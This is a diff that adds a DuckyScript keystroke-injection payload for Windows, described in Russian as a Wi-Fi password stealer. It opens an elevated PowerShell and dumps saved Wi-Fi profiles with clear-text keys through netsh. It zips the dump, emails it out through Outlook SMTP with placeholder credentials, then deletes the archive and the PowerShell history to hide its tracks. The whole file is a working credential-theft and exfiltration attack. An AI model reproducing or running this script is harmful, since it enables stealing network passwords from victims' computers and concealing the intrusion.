@@ -1,0 +1,63 @@
+REM Title: Ворователь паролей от вайфаев через зип архив
+REM Arthor xthr0, https://github.com/xthr0/
+REM Target: Windows 10/11 (с правами админа)
+REM Это скрипт из костылей, копипаст из одного второго третьего скриптов. Поэтому можно считать, что это я сделал, ибо другие не работали
+DELAY 500
+WINDOWS d
+DELAY 500
+WINDOWS r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1200
+LEFTARROW
+ENTER
+DELAY 500
+GUI UP
+DELAY 600
+STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss'); $userDir = (Get-ChildItem env:\userprofile).value + '\PasswordsList' + $folderDateTime; $fileSaveDir = New-Item  ($userDir) -ItemType Directory;$date = get-date; netsh wlan export profile key=clear folder=$fileSaveDir; Compress-Archive -Path $fileSaveDir -DestinationPath C:\Passwords.zip
+ENTER
+DEFAULT_DELAY 600
+STRING $SMTPServer = 'smtp-mail.outlook.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSSL = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('почта@outlook.com', 'пароль')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'почта@outlook.com'
+ENTER
+STRING $ReportEmail.To.Add('адрес почты доставки')
+ENTER
+STRING $ReportEmail.Subject = 'WiFi passwords'
+ENTER
+STRING $ReportEmail.Attachments.Add('C:\Passwords.zip')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 4000
+STRING exit
+ENTERq
+
+WINDOWS r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 800
+LEFTARROW
+ENTER
+STRING del 'C:\Passwords.zip'
+ENTER
+STRING cd $HOME
+ENTER
+STRING del PasswordsList
+TAB
+ENTER
+ENTER
+STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
+ENTER
+STRING exit
+ENTER
